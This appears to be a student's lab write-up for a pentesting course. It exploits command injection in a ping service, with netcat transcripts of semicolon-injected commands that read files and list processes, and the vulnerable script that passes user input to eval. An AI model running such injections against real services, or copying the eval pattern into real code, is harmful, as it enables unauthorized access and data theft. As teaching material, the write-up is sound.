# Writeup 2 - Pentesting

Name: Marco Roxas
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Marco Roxas

## Assignment Writeup

### Part 1 (45 pts)

In summary, the steps taken were:

- Experimented with accepted input (ip address, eg, 157.230.179.99, 8.8.8.8, localhost)
- Experimented with the semicolon as it's a common command line injection technique (eg, ;ls, ;whoami)
- Tried ;ls home (led to flag)
- Tried ;ps aux (led to opt/container_startup.sh)

By starting with an IP address to see the response and then experimenting with different inputs (especially the semicolon, which delimits a command and starts a new one) and corresponding responses, it became apparent that the input was being run as part of the ping command. After some experiments the IP address was dropped and just the semicolon was typed and then the command. Some commands I tried were ls and whoami.

But it was odd at first because the connection would time out and it wasn't obvious that spaces were allowed in the input. I initially thought that only single keywords were allowed. So I tried various quote characters and double-dashes to get around to what I thought was a single-keyword limitation. Multiple commands were tried as well, separated by varying spaces, but with not much luck.

Fortunately I realized I could include spaces (which overcame a serious limitation) and was able to look in the /home directory and cat the flag.

  Good! Here's your flag: CMSC389R-{p1ng_as_a_$erv1c3}

Just by habit I tried ps aux and saw a script running. Not knowing what it was (I wanted to know what was in opt first) I did a find opt and cat the script, which showed how the ping script. It appears that this is the script behind the service, somehow the echo commands are redirected to the remote client and the read is taken from the client.

~~~~
#!/bin/bash

function quit {
        exit
}

echo "~~~~ WATTSAMP ENERGY ~~~~"

echo "Network Administration Panel  --  Uptime Monitor "
echo -n "Enter IP address: "
read -t 5 input || quit
>&2 echo "[$(date)] INPUT: $input"

cmd="ping -w 5 -c 2 $input"
output=$(eval $cmd)

echo "$output"
~~~~

To address this vulnerability the input can be whitelisted as a valid ip address before running the ping command.

A brief transcript is included below:

~~~~
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;ls           ;ls home

Ncat: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;find home
home
home/flag.txt


Ncat: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;cat home/flag.txt
Good! Here's your flag: CMSC389R-{p1ng_as_a_$erv1c3}


Ncat: Broken pipe.
$
at: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1 10.5  0.0  18376  2892 ?        Ss   17:11   0:00 /bin/bash /opt/container_startup.sh /bin/bash
root         7  0.0  0.0  18376  1832 ?        S    17:11   0:00 /bin/bash /opt/container_startup.sh /bin/bash
root         9  0.0  0.0  34400  2860 ?        R    17:11   0:00 ps aux


Ncat: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;find opt
opt
opt/container_startup.sh


Ncat: Broken pipe.
$ nc wattsamp.net 1337
~~~~ WATTSAMP ENERGY ~~~~
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;cat opt/c*
#!/bin/bash

function quit {
        exit
}

echo "~~~~ WATTSAMP ENERGY ~~~~"

echo "Network Administration Panel  --  Uptime Monitor "
echo -n "Enter IP address: "
read -t 5 input || quit
>&2 echo "[$(date)] INPUT: $input"

cmd="ping -w 5 -c 2 $input"
output=$(eval $cmd)

echo "$output"


Ncat: Broken pipe.
~~~~

### Part 2 (55 pts)

A short ruby script was written to leverage the command-line injection vulnerability.

The script prints a menu with options to drop into a shell and download files. The shell is implemented as a loop that reads the command the user wishes to run, and then opens a network connection, run it via command-line injection, and then present the output to the user. The download function is implemented similarly except the cat command is run and the resulting output is captured to a file.

The user's current directory had to be remembered between sessions of the shell because the session is essentially stateless. This was achieved by sending a cd command before the user's command.
